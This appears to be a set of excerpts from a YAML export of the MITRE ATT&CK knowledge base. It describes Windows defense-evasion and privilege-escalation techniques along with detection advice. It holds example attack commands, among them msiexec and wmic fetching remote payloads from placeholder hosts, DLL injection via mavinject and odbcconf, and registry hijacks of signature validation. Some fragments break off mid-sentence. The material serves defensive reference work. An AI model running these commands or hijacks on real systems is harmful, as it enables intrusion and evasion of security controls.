        Because of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs) (Citation: EduardosBlog SIPs July 2008) to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all  (Citation: Microsoft Catalog Files and Signatures April 2017)) and are identified by globally unique identifiers (GUIDs). (Citation: SpectorOps Subverting Trust Sept 2017)

        Similar to [Code Signing](https://attack.mitre.org/techniques/T1116), adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and whitelisting tools to classify malicious (or any) code as signed by: (Citation: SpectorOps Subverting Trust Sept 2017)

        * Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\SOFTWARE[\WOW6432Node\]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{SIP_GUID}</code> that point to the dynamic link library (DLL) providing a SIP’s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file’s real signature, an adversary can apply an acceptable signature value all files using that SIP (Citation: GitHub SIP POC Sept 2017) (although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file).
        * Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\SOFTWARE\[WOW6432Node\]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{SIP_GUID}</code> that point to the DLL providing a SIP’s CryptSIPDllVerifyIndirectData function, which validates a file’s computed hash against the signed hash value. By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP (Citation: GitHub SIP POC Sept 2017) (with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk.
        * Modifying the <code>DLL</code> and <code>Function</code> Registry values in <code>HKLM\SOFTWARE\[WOW6432Node\]Microsoft\Cryptography\Providers\Trust\FinalPolicy\{trust provider GUID}</code> that point to the DLL providing a trust provider’s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIP’s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex).
        * **Note:** The above hijacks are also possible without modifying the Registry via [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038).

        Hijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation. (Citation: SpectorOps Subverting Trust Sept 2017)

        Enable CryptoAPI v2 (CAPI) event logging (Citation: Entrust Enable CAPI2 Aug 2017) to monitor and analyze error events related to failed trust validation (Event ID 81, though this event can be subverted by hijacked trust provider components) as well as any other provided information events (ex: successful validations). Code Integrity event logging may also provide valuable indicators of malicious SIP or trust provider loads, since protected processes that attempt to load a maliciously-crafted trust validation component will likely fail (Event ID 3033).

        **Note:** As part of this technique, adversaries may attempt to manually edit these Registry keys (ex: Regedit) or utilize the legitimate registration process using [Regsvr32](https://attack.mitre.org/techniques/T1117). (Citation: SpectorOps Subverting Trust Sept 2017)

      description: |-
        Adversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and [PowerShell](https://attack.mitre.org/techniques/T1086) but could also be in the form of command-line batch scripts.

        Scripts can be embedded inside Office documents as macros that can be set to execute when files used in [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), where adversaries will rely on macros being allowed or that the user will accept to activate them.

        Many popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit (Citation: Metasploit_Ref), Veil (Citation: Veil_Ref), and PowerSploit (Citation: Powersploit) are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. (Citation: Alperovitch 2014)

        Scripting may be common on admin, developer, or power user systems, depending on job function. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.

        Scripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.

        Analyze Office file attachments for potentially malicious macros. Execution of macros may create suspicious process trees depending on what the macro is designed to do. Office processes, such as winword.exe, spawning instances of cmd.exe, script application like wscript.exe or powershell.exe, or other suspicious processes may indicate malicious activity.

      description: |-
        Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files. This behavior may be abused by adversaries to execute malicious files that could bypass application whitelisting and signature validation on systems. This technique accounts for proxy execution methods that are not already accounted for within the existing techniques.

        ### Msiexec.exe
        Msiexec.exe is the command-line Windows utility for the Windows Installer. Adversaries may use msiexec.exe to launch malicious MSI files for code execution. An adversary may use it to launch local or network accessible MSI files.(Citation: LOLBAS Msiexec)(Citation: Rancor Unit42 June 2018)(Citation: TrendMicro Msiexec Feb 2018) Msiexec.exe may also be used to execute DLLs.(Citation: LOLBAS Msiexec)

        * <code>msiexec.exe /q /i "C:\path\to\file.msi"</code>
        * <code>msiexec.exe /q /i http[:]//site[.]com/file.msi</code>
        * <code>msiexec.exe /y "C:\path\to\file.dll"</code>

        ### Mavinject.exe
        Mavinject.exe is a Windows utility that allows for code execution. Mavinject can be used to input a DLL into a running process. (Citation: Twitter gN3mes1s Status Update MavInject32)

        * <code>"C:\Program Files\Common Files\microsoft shared\ClickToRun\MavInject32.exe" &lt;PID&gt; /INJECTRUNNING &lt;PATH DLL&gt;</code>
        * <code>C:\Windows\system32\mavinject.exe &lt;PID&gt; /INJECTRUNNING &lt;PATH DLL&gt;</code>

        ### SyncAppvPublishingServer.exe
        SyncAppvPublishingServer.exe can be used to run PowerShell scripts without executing powershell.exe. (Citation: Twitter monoxgas Status Update SyncAppvPublishingServer)

        ### Odbcconf.exe
        Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names.(Citation: Microsoft odbcconf.exe) The utility can be misused to execute functionality equivalent to [Regsvr32](https://attack.mitre.org/techniques/T1117) with the REGSVR option to execute a DLL.(Citation: LOLBAS Odbcconf)(Citation: TrendMicro Squiblydoo Aug 2017)(Citation: TrendMicro Cobalt Group Nov 2017)

        * <code>odbcconf.exe /S /A &lbrace;REGSVR "C:\Users\Public\file.dll"&rbrace;</code>

        Several other binaries exist that may be used to perform similar behavior. (Citation: GitHub Ultimate AppLocker Bypass List)

      name: Software Packing
      description: |-
        Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory.

        Utilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, (Citation: Wikipedia Exe Compression) but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.

        Adversaries may use virtual machine software protection as a form of software packing to protect their code. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.(Citation: ESET FinFisher Jan 2018)

        how the file is processed by the operating system. For example, if there is
        a Mach-O executable file called evil.bin, when it is double clicked by a user,
        it will launch Terminal.app and execute. If this file is renamed to evil.txt,
        then when double clicked by a user, it will launch with the default text editing
        application (not executing the binary). However, if the file is renamed to
        \"evil.txt \" (note the space at the end), then when double clicked by a user,
        the true file type is determined by the OS and handled appropriately and the

        Microsoft’s Open Office XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered. (Citation: Microsoft Open XML July 2017)

        Properties within parts may reference shared public resources accessed via online URLs. For example, template properties reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded.

        Adversaries may abuse this technology to initially conceal malicious code to be executed via documents (i.e. [Scripting](https://attack.mitre.org/techniques/T1064)). Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded. (Citation: SANS Brian Wiltse Template Injection) These documents can be delivered via other techniques such as [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) and/or [Taint Shared Content](https://attack.mitre.org/techniques/T1080) and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched. (Citation: Redxorblue Remote Template Injection) Examples have been seen in the wild where template injection was used to load malicious code containing an exploit. (Citation: MalwareBytes Template Injection OCT 2017)

        This technique may also enable [Forced Authentication](https://attack.mitre.org/techniques/T1187) by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt.

      name: Trusted Developer Utilities
      description: "There are many utilities used for software development related
        tasks that can be used to execute code in various forms to assist in development,
        debugging, and reverse engineering. These utilities may often be signed with
        legitimate certificates that allow them to execute on a system and proxy execution
        of malicious code through a trusted process that effectively bypasses application
        whitelisting defensive solutions.\n\n### MSBuild\n\nMSBuild.exe (Microsoft
        Build Engine) is a software build platform used by Visual Studio. It takes
        XML formatted project files that define requirements for building various
        platforms and configurations. (Citation: MSDN MSBuild) \n\nAdversaries can
        use MSBuild to proxy execution of code through a trusted Windows utility.
        The inline task capability of MSBuild that was introduced in .NET version
        4 allows for C# code to be inserted into the XML project file. (Citation:
        MSDN MSBuild) Inline Tasks MSBuild will compile and execute the inline task.
        MSBuild.exe is a signed Microsoft binary, so when it is used this way it can
        execute arbitrary code and bypass application whitelisting defenses that are
        configured to allow MSBuild.exe execution. (Citation: LOLBAS Msbuild)\n\n###
        DNX\n\nThe .NET Execution Environment (DNX), dnx.exe, is a software development
        kit packaged with Visual Studio Enterprise. It was retired in favor of .NET
        Core CLI in 2016. (Citation: Microsoft Migrating from DNX) DNX is not present
        on standard builds of Windows and may only be present on developer workstations
        using older versions of .NET Core and ASP.NET Core 1.0. The dnx.exe executable
        is signed by Microsoft. \n\nAn adversary can use dnx.exe to proxy execution
        of arbitrary code to bypass application whitelist policies that do not account
        for DNX. (Citation: engima0x3 DNX Bypass)\n\n### RCSI\n\nThe rcsi.exe utility
        is a non-interactive command-line interface for C# that is similar to csi.exe.
        It was provided within an early version of the Roslyn .NET Compiler Platform
        but has since been deprecated for an integrated solution. (Citation: Microsoft
        Roslyn CPT RCSI) The rcsi.exe binary is signed by Microsoft. (Citation: engima0x3
        RCSI Bypass)\n\nC# .csx script files can be written and executed with rcsi.exe
        at the command-line. An adversary can use rcsi.exe to proxy execution of arbitrary
        code to bypass application whitelisting policies that do not account for execution
        of rcsi.exe. (Citation: engima0x3 RCSI Bypass)\n\n### WinDbg/CDB\n\nWinDbg
        is a Microsoft Windows kernel and user-mode debugging utility. The Microsoft
        Console Debugger (CDB) cdb.exe is also user-mode debugger. Both utilities
        are included in Windows software development kits and can be used as standalone
        tools. (Citation: Microsoft Debugging Tools for Windows) They are commonly
        used in software development and reverse engineering and may not be found
        on typical Windows systems. Both WinDbg.exe and cdb.exe binaries are signed
        by Microsoft.\n\nAn adversary can use WinDbg.exe and cdb.exe to proxy execution
        of arbitrary code to bypass application whitelist policies that do not account
        for execution of those utilities. (Citation: Exploit Monday WinDbg)\n\nIt
        is likely possible to use other debuggers for similar purposes, such as the
        kernel-mode debugger kd.exe, which is also signed by Microsoft.\n\n### Tracker\n\nThe
        file tracker utility, tracker.exe, is included with the .NET framework as
        part of MSBuild. It is used for logging calls to the Windows file system.
        (Citation: Microsoft Docs File Tracking)\n\nAn adversary can use tracker.exe
        to proxy execution of an arbitrary DLL into another process. Since tracker.exe
        is also signed it can be used to bypass application whitelisting solutions.

        The presence of these or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.

        Use process monitoring to monitor the execution and arguments of MSBuild.exe, dnx.exe, rcsi.exe, WinDbg.exe, cdb.exe, and tracker.exe. Compare recent invocations of those binaries with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. It is likely that these utilities will be used by software developers or for other software development related tasks, so if it exists and is used outside of that context, then the event may be suspicious. Command arguments used before and after invocation of the utilities may also be useful in determining the origin and purpose of the binary being executed.

        Adversaries may create cloud instances in unused geographic service regions in order to evade detection. Access is usually obtained through compromising accounts used to manage cloud infrastructure.

        Cloud service providers often provide infrastructure throughout the world in order to improve performance, provide redundancy, and allow customers to meet compliance requirements. Oftentimes, a customer will only use a subset of the available regions and may not actively monitor other regions. If an adversary creates resources in an unused region, they may be able to operate undetected.

        A variation on this behavior takes advantage of differences in functionality across cloud regions. An adversary could utilize regions which do not support advanced detection services in order to avoid detection of their activity. For example, AWS GuardDuty is not supported in every region.(Citation: AWS Region Service Table)

        An example of adversary use of unused AWS regions is to mine cryptocurrency through [Resource Hijacking](https://attack.mitre.org/techniques/T1496), which can cost organizations substantial amounts of money over time depending on the processing power used.(Citation: CloudSploit - Unused AWS Regions)

        account using Credential Access techniques or capture credentials earlier
        in their reconnaissance process through social engineering for means of gaining
        Initial Access. \n\nAccounts that an adversary may use can fall into three
        categories: default, local, and domain accounts. Default accounts are those
        that are built-into an OS such as Guest or Administrator account on Windows
        systems or default factory/provider set accounts on other types of systems,
        software, or devices. Local accounts are those configured by an organization
        for use by users, remote support, services, or for administration on a single
        system or service. (Citation: Microsoft Local Accounts Feb 2019) Domain accounts
        are those managed by Active Directory Domain Services where access and permissions
        are configured across systems and services that are part of that domain. Domain
        accounts can cover users, administrators, and services.\n\nCompromised credentials
        may be used to bypass access controls placed on various resources on systems
        within the network and may even be used for persistent access to remote systems
        and externally available services, such as VPNs, Outlook Web Access and remote
        desktop. Compromised credentials may also grant an adversary increased privilege
        to specific systems or access to restricted areas of the network. Adversaries
        may choose not to use malware or tools in conjunction with the legitimate
        access those credentials provide to make it harder to detect their presence.\n\nDefault
        accounts are also not limited to Guest and Administrator on client machines,
        they also include accounts that are preset for equipment such as network devices
        and computer applications whether they are internal, open source, or COTS.
        Appliances that come preset with a username and password combination pose
        a serious threat to organizations that do not change it post installation,
        as they are easy targets for an adversary. Similarly, adversaries may also
        utilize publicly disclosed private keys, or stolen private keys, to legitimately
        connect to remote environments via [Remote Services](https://attack.mitre.org/techniques/T1021)
        (Citation: Metasploit SSH Module)\n\nThe overlap of account access, credentials,
        and permissions across a network of systems is of concern because the adversary
        may be able to pivot across accounts and systems to reach a high level of
        access (i.e., domain or enterprise administrator) to bypass access controls
        set within the enterprise. (Citation: TechNet Credential Theft)"

        account logged into multiple systems simultaneously; multiple accounts logged
        into the same machine simultaneously; accounts logged in at odd times or outside
        of business hours. Activity may be from interactive login sessions or process

        (e.g., a user has an active login session but has not entered the building
        or does not have VPN access).\n\nPerform regular audits of domain and local
        system accounts to detect accounts that may have been created by an adversary
        for persistence. Checks on these accounts could also include whether default
        accounts such as Guest have been activated. These audits should also include

      description: "Adversaries may check for the presence of a virtual machine environment
        (VME) or sandbox to avoid potential detection of tools and activities. If
        the adversary detects a VME, they may alter their malware to conceal the core
        functions of the implant or disengage from the victim. They may also search
        for VME artifacts before dropping secondary or additional payloads. Adversaries
        may use the information from learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497)
        during automated discovery to shape follow-on behaviors.\n\nAdversaries may
        use several methods including [Security Software Discovery](https://attack.mitre.org/techniques/T1063)
        to accomplish [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497)
        by searching for security monitoring tools (e.g., Sysinternals, Wireshark,
        etc.) to help determine if it is an analysis environment. Additional methods
        include use of sleep timers or loops within malware code to avoid operating
        within a temporary sandboxes. (Citation: Unit 42 Pirpi July 2015)\n\n###Virtual
        Machine Environment Artifacts Discovery###\n\nAdversaries may use utilities
        such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047),
        [PowerShell](https://attack.mitre.org/techniques/T1086), [Systeminfo](https://attack.mitre.org/software/S0096),
        and the [Query Registry](https://attack.mitre.org/techniques/T1012) to obtain
        system information and search for VME artifacts. Adversaries may search for
        VME artifacts in memory, processes, file system, and/or the Registry. Adversaries
        may use [Scripting](https://attack.mitre.org/techniques/T1064) to combine
        these checks into one script and then have the program exit if it determines
        the system to be a virtual environment. Also, in applications like VMWare,
        adversaries can use a special I/O port to send commands and receive output.
        Adversaries may also check the drive size. For example, this can be done using
        the Win32 DeviceIOControl function. \n\nExample VME Artifacts in the Registry(Citation:
        McAfee Virtual Jan 2017)\n\n* <code>HKLM\\SOFTWARE\\Oracle\\VirtualBox Guest
        Additions</code>\n* <code>HKLM\\HARDWARE\\Description\\System\\”SystemBiosVersion”;”VMWARE”</code>\n*
        <code>HKLM\\HARDWARE\\ACPI\\DSDT\\BOX_</code>\n\nExample VME files and DLLs
        on the system(Citation: McAfee Virtual Jan 2017)\n\n* <code>WINDOWS\\system32\\drivers\\vmmouse.sys</code>
        \n* <code>WINDOWS\\system32\\vboxhook.dll</code>\n* <code>Windows\\system32\\vboxdisp.dll</code>\n\nCommon
        checks may enumerate services running that are unique to these applications,
        installed programs on the system, manufacturer/product fields for strings
        relating to virtual machine applications, and VME-specific hardware/processor
        instructions.(Citation: McAfee Virtual Jan 2017)\n\n###User Activity Discovery###\n\nAdversaries
        may search for user activity on the host (e.g., browser history, cache, bookmarks,
        number of files in the home directories, etc.) for reassurance of an authentic
        environment. They might detect this type of information via user interaction
        and digital signatures. They may have malware check the speed and frequency
        of mouse clicks to determine if it’s a sandboxed environment.(Citation: Sans
        Virtual Jan 2016) Other methods may rely on specific user interaction with
        the system before the malicious code is activated. Examples include waiting
        for a document to close before activating a macro (Citation: Unit 42 Sofacy
        Nov 2018) and waiting for a user to double click on an embedded image to activate
        (Citation: FireEye FIN7 April 2017).\n\n###Virtual Hardware Fingerprinting
        Discovery###\n\nAdversaries may check the fan and temperature of the system
        to gather evidence that can be indicative a virtual environment. An adversary
        may perform a CPU check using a WMI query <code>$q = “Select * from Win32_Fan”
        Get-WmiObject -Query $q</code>. If the results of the WMI query return more
        than zero elements, this might tell them that the machine is a physical one.

        Adversaries may use an existing, legitimate external Web service as a means for relaying commands to a compromised system.

        These commands may also include pointers to command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.

        Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.

        Use of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).

      name: XSL Script Processing
      description: |-
        Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)

        Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses. Similar to [Trusted Developer Utilities](https://attack.mitre.org/techniques/T1127), the Microsoft common line transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.(Citation: XSL Bypass Mar 2019)

        Command-line examples:(Citation: Penetration Testing Lab MSXSL July 2017)(Citation: XSL Bypass Mar 2019)

        * <code>msxsl.exe customers[.]xml script[.]xsl</code>
        * <code>msxsl.exe script[.]xsl script[.]xsl</code>
        * <code>msxsl.exe script[.]jpeg script[.]jpeg</code>

        Another variation of this technique, dubbed “Squiblytwo”, involves using [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) to invoke JScript or VBScript within an XSL file.(Citation: LOLBAS Wmic) This technique can also execute local/remote scripts and, similar to its [Regsvr32](https://attack.mitre.org/techniques/T1117)/ "Squiblydoo" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) provided they utilize the /FORMAT switch.(Citation: XSL Bypass Mar 2019)

        Command-line examples:(Citation: XSL Bypass Mar 2019)(Citation: LOLBAS Wmic)

        * Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>
        * Remote File: <code>wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”</code>

        Use process monitoring to monitor the execution and arguments of msxsl.exe and wmic.exe. Compare recent invocations of these utilities with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity (ex: URL command line arguments, creation of external network connections, loading of DLLs associated with scripting). (Citation: LOLBAS Wmic) (Citation: Twitter SquiblyTwo Detection APR 2018) Command arguments used before and after the script invocation may also be useful in determining the origin and purpose of the payload being loaded.

        The presence of msxsl.exe or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.

      name: Access Token Manipulation
      description: "Windows uses access tokens to determine the ownership of a running
        process. A user can manipulate access tokens to make a running process appear
        as though it belongs to someone other than the user that started the process.
        When this occurs, the process also takes on the security context associated
        with the new token. For example, Microsoft promotes the use of access tokens
        as a security best practice. Administrators should log in as a standard user
        but run their tools with administrator privileges using the built-in access
        token manipulation command <code>runas</code>.(Citation: Microsoft runas)\n
        \ \nAdversaries may use access tokens to operate under a different user or
        system security context to perform actions and evade detection. An adversary
        can use built-in Windows API functions to copy access tokens from existing
        processes; this is known as token stealing. An adversary must already be in
        a privileged user context (i.e. administrator) to steal a token. However,
        adversaries commonly use token stealing to elevate their security context
        from the administrator level to the SYSTEM level. An adversary can use a token
        to authenticate to a remote system as the account for that token if the account
        has appropriate permissions on the remote system.(Citation: Pentestlab Token
        Manipulation)\n\nAccess tokens can be leveraged by adversaries through three
        methods:(Citation: BlackHat Atkinson Winchester Token Manipulation)\n\n**Token
        Impersonation/Theft** - An adversary creates a new access token that duplicates
        an existing token using <code>DuplicateToken(Ex)</code>. The token can then
        be used with <code>ImpersonateLoggedOnUser</code> to allow the calling thread
        to impersonate a logged on user's security context, or with <code>SetThreadToken</code>
        to assign the impersonated token to a thread. This is useful for when the
        target user has a non-network logon session on the system.\n\n**Create Process
        with a Token** - An adversary creates a new access token with <code>DuplicateToken(Ex)</code>
        and uses it with <code>CreateProcessWithTokenW</code> to create a new process
        running under the security context of the impersonated user. This is useful
        for creating a new process under the security context of a different user.\n\n**Make
        and Impersonate Token** - An adversary has a username and password but the
        user is not logged onto the system. The adversary can then create a logon
        session for the user using the <code>LogonUser</code> function. The function
        will return a copy of the new session's access token and the adversary can
        use <code>SetThreadToken</code> to assign the token to a thread.\n\nAny standard
        user can use the <code>runas</code> command, and the Windows API functions,
        to create impersonation tokens; it does not require access to an administrator
        account.\n\nMetasploit’s Meterpreter payload allows arbitrary token manipulation
        and uses token impersonation to escalate privileges.(Citation: Metasploit
        access token) The Cobalt Strike beacon payload allows arbitrary token impersonation
        and can also create tokens. (Citation: Cobalt Strike Access Token)"

        Detailed command-line logging is not enabled by default in Windows.(Citation:
        Microsoft Command-line Logging)\n\nIf an adversary is using a payload that
        calls the Windows token APIs directly, analysts can detect token manipulation
        only through careful analysis of user network activity, examination of running
        processes, and correlation with other endpoint and network behavior. \n\nThere
        are many Windows API calls a payload can take advantage of to manipulate access

      name: Accessibility Features
      description: |-
        Windows contains accessibility features that may be launched with a key combination before a user has logged in (for example, when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.

        Two common accessibility programs are <code>C:\Windows\System32\sethc.exe</code>, launched when the shift key is pressed five times and <code>C:\Windows\System32\utilman.exe</code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as "sticky keys", and has been used by adversaries for unauthenticated access through a remote desktop login screen. (Citation: FireEye Hikit Rootkit)

        Depending on the version of Windows, an adversary may take advantage of these features in different ways because of code integrity enhancements. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\</code>, and it must be protected by Windows File or Resource Protection (WFP/WRP). (Citation: DEFCON2016 Sticky Keys) The debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced. Examples for both methods:

        For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <code>C:\Windows\System32\utilman.exe</code>) may be replaced with "cmd.exe" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1076) will cause the replaced file to be executed with SYSTEM privileges. (Citation: Tilbury 2014)

        For the debugger method on Windows Vista and later as well as Windows Server 2008 and later, for example, a Registry key may be modified that configures "cmd.exe," or another program that provides backdoor access, as a "debugger" for the accessibility program (e.g., "utilman.exe"). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with RDP will cause the "debugger" program to be executed with SYSTEM privileges. (Citation: Tilbury 2014)

        Other accessibility features exist that may also be leveraged in a similar fashion: (Citation: DEFCON2016 Sticky Keys)

        * On-Screen Keyboard: <code>C:\Windows\System32\osk.exe</code>
        * Magnifier: <code>C:\Windows\System32\Magnify.exe</code>
        * Narrator: <code>C:\Windows\System32\Narrator.exe</code>
        * Display Switcher: <code>C:\Windows\System32\DisplaySwitch.exe</code>
        * App Switcher: <code>C:\Windows\System32\AtBroker.exe</code>

      name: Application Shimming
      description: "The Microsoft Windows Application Compatibility Infrastructure/Framework
        (Application Shim) was created to allow for backward compatibility of software
        as the operating system codebase changes over time. For example, the application
        shimming feature allows developers to apply fixes to applications (without
        rewriting code) that were created for Windows XP so that it will work with
        Windows 10. (Citation: Endgame Process Injection July 2017) Within the framework,
        shims are created to act as a buffer between the program (or more specifically,
        the Import Address Table) and the Windows OS. When a program is executed,
        the shim cache is referenced to determine if the program requires the use
        of the shim database (.sdb). If so, the shim database uses [Hooking](https://attack.mitre.org/techniques/T1179)
        to redirect the code as necessary in order to communicate with the OS. \n\nA
        list of all shims currently installed by the default Windows installer (sdbinst.exe)
        is kept in:\n\n* <code>%WINDIR%\\AppPatch\\sysmain.sdb</code>\n* <code>hklm\\software\\microsoft\\windows
        nt\\currentversion\\appcompatflags\\installedsdb</code>\n\nCustom databases
        are stored in:\n\n* <code>%WINDIR%\\AppPatch\\custom & %WINDIR%\\AppPatch\\AppPatch64\\Custom</code>\n*
        <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\custom</code>\n\nTo
        keep shims secure, Windows designed them to run in user mode so they cannot
        modify the kernel and you must have administrator privileges to install a
        shim. However, certain shims can be used to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088)
        (UAC) (RedirectEXE), inject DLLs into processes (InjectDLL), disable Data
        Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH),
        and intercept memory addresses (GetProcAddress). Similar to [Hooking](https://attack.mitre.org/techniques/T1179),
        utilizing these shims may allow an adversary to perform several malicious
        acts such as elevate privileges, install backdoors, disable defenses like
        Windows Defender, etc."

      name: Bypass User Account Control
      description: |-
        Windows User Account Control (UAC) allows a program to elevate its privileges to perform a task under administrator-level permissions by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action. (Citation: TechNet How UAC Works)

        If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs are allowed to elevate privileges or execute some elevated COM objects without prompting the user through the UAC notification box. (Citation: TechNet Inside UAC) (Citation: MSDN COM Elevation) An example of this is use of rundll32.exe to load a specifically crafted DLL which loads an auto-elevated COM object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user. (Citation: Davidson Windows) Adversaries can use these techniques to elevate privileges to administrator if the target process is unprotected.

        Many methods have been discovered to bypass UAC. The Github readme page for UACMe contains an extensive list of methods (Citation: Github UACMe) that have been discovered and implemented within UACMe, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:

        * <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script. (Citation: enigma0x3 Fileless UAC Bypass) (Citation: Fortinet Fareit)

        Another bypass is possible through some Lateral Movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on lateral systems and default to high integrity. (Citation: SANS UAC Bypass)

        There are many ways to perform UAC bypasses when a user is in the local administrator group on a system, so it may be difficult to target detection on all variations. Efforts should likely be placed on mitigation and collecting enough information on process launches and actions that could be performed before and after a UAC bypass is performed. Monitor process API calls for behavior that may be indicative of [Process Injection](https://attack.mitre.org/techniques/T1055) and unusual loaded DLLs through [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038), which indicate attempts to gain access to higher privileged processes.

        Some UAC bypass methods rely on modifying specific, user-accessible Registry settings. For example:

